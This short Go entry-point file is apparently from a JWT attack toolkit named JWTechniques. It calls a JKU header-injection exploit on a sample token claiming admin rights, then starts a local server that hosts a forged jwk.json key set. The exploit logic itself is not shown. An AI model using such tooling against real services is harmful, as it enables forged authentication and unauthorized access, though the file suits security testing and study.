/*
Copyright © 2025 NAME HERE <EMAIL ADDRESS>
*/
package main

import (
	"JWTechniques/attacks"
)

func main() {
	attacks.ExploitJKU("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30")
	attacks.LaunchServer(12345, "jwk.json")
	//cmd.Execute()
}
